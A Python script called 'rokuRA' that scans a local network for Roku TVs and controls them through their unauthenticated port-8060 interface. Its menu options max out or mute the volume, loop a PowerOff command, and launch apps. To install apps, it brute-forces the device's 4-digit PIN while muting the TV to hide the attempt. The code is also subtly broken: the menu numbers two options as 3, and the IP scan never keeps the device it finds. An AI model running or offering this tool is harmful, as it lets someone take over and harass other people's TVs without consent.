#!/usr/bin/env python3
##############
# Roku Remote Access ('rokuRA')

# Double-line box drawing characters:
# Corners:
# ╔  ╗  ╚  ╝

# Horizontal and vertical lines:
# ═  (Double horizontal line)
# ║  (Double vertical line)

# Intersections:
# ╦  (Top intersection)
# ╩  (Bottom intersection)
# ╠  (Left intersection)
# ╣  (Right intersection)
# ╬  (Center intersection)

# Importing necessary libraries
import requests
import time
import subprocess
from tqdm import tqdm

# Function to check if an app is already installed given the app ID. Returns a Boolean
def check_app_installed(ip, app_id):
    response = requests.get(f"http://{ip}:8060/query/apps")
    return f'<app id="{app_id}"' in response.text

# Function to send keypresses to the Roku TV given the key as a string
def send_keypress(ip, key):
    requests.post(f"http://{ip}:8060/keypress/{key}")

# Function for bruteforcing the 4-digit pin
def try_combinations(ip, app_id):

    for i in range(10000):
        combination = f"{i:04}"
        for digit in combination:
            send_keypress(ip, f"Lit_{digit}")

        send_keypress(ip, "Select")
        if check_app_installed(ip, app_id):
            return True
        
        send_keypress(ip, "Up")
    return False

# Function for installing an app given the app ID
def install_app(ip, app_id):

    # Changing volume down to 0
    for i in tqdm(range(100), desc="Adjusting Volume"):
        send_keypress(ip, "VolumeDown")

    # Attempts to install the app
    requests.post(f"http://{ip}:8060/install/{app_id}")

    if try_combinations(ip, app_id):
        print(f"App {app_id} successfully installed.")

        # Increases volume back up to 15
        for i in tqdm(range(15), desc="Adjusting Volume"):
            send_keypress(ip, "VolumeUp")

    else:
        print(f"Failed to install app {app_id}.")

  
def draw_menu():
    print("""\033[35m
██████╗  ██████╗ ██╗  ██╗██╗   ██╗      ██████╗  █████╗ 
██╔══██╗██╔═══██╗██║ ██╔╝██║   ██║      ██╔══██╗██╔══██╗
██████╔╝██║   ██║█████╔╝ ██║   ██║█████╗██████╔╝███████║
██╔══██╗██║   ██║██╔═██╗ ██║   ██║╚════╝██╔══██╗██╔══██║
██║  ██║╚██████╔╝██║  ██╗╚██████╔╝      ██║  ██║██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝""")
    print("\033[0m")
    print("\033[35m╔═════════>\033[0m Select an Option")
    print("\033[35m╠>\033[0m (1) Custom Input")
    print("\033[35m╠>\033[0m (2) Max out Volume")
    print("\033[35m╠>\033[0m (3) Minimize Volume")
    print("\033[35m╠>\033[0m (3) Loop Shutdown")
    print("\033[35m╠>\033[0m (5) Launch App")
    print("\033[35m╠>\033[0m (6) Install an App")
    print("\033[35m╠>\033[0m (7) Exit")
    print("\033[35m╚═════════\033[0m")

def select_option(ip):
    while True:

        # Display all options
        draw_menu()
        option = input("")
        
        if option == '1':
            keystroke = input("Enter the key ID: ")
            send_keypress(ip, keystroke)

        elif option == '2':
            for i in tqdm(range(100), desc="Adjusting Volume"):
                send_keypress(ip, "VolumeUp")
            requests.post(f"http://{ip}:8060/launch/259656")

        elif option == '3':
            for i in tqdm(range(100), desc="Adjusting Volume"):
                send_keypress(ip, "VolumeDown")
            requests.post(f"http://{ip}:8060/launch/259656")

        elif option == '4':
            print("Powering off the TV. Press Ctrl+C to exit.")
            while True:
                try:
                    send_keypress(ip, "PowerOff")
                    time.sleep(1)
                except KeyboardInterrupt:
                    break

        elif option == '5':
            app_id = input("Enter the app number: ")
            requests.post(f"http://{ip}:8060/launch/{app_id}")
            print("Custom app launched!")

        elif option == '6':
            app_id = input("Enter the app number: ")
            if check_app_installed(ip, app_id):
                print(f"App {app_id} is already installed")
            else:
                install_app(ip, app_id)

        elif option == '7':
            exit()
        else:
            print("Invalid option, please try again.")




#requests.post(f"http://{ip}:8060/launch/259656") --- launches an app


# The base IP address is set to ###.###.##.____ where the last 3 digits are missing
base_ip = ""

# Prompts for the ip address, and if it is empty it will attempt to automatically detect the ip address
ip = input("\nEnter the IP Address of the Roku TV (no input will result in automatic detection): ")

# automatic detection
if ip == "":
    base_ip = input("Enter the base IP: ")
    timeout = input("\n Please input the delay between each scan, higher values will result in a slower scan but lower values may skip over the device: ")
    # Iterate through the last octet from 255 to 0
    for i in range(255, -1, -1):
        # Construct the full IP address
        ip = f"{base_ip}.{i}"
        url = f"http://{ip}:8060/query/device-info"

        if i == 0:
            print("No Roku device found.")
            exit()

        try:
            # Send a request to the Roku device info endpoint
            response = requests.get(url, timeout=float(timeout))  # Timeout set to 0.5 seconds to speed up the scan
            if response.status_code == 200:
                print(f"Possible Roku found at: {ip}")
                continue
        except requests.ConnectionError:
            # If the connection fails, just continue to the next IP
            print(f"Connection error, moving to next ip, {i}")
            continue
        except requests.Timeout:
            # If the request times out, continue to the next IP
            print("Timeout, moving to next ip, {i}")
            continue

print("Scan completed.")
select_option(ip)
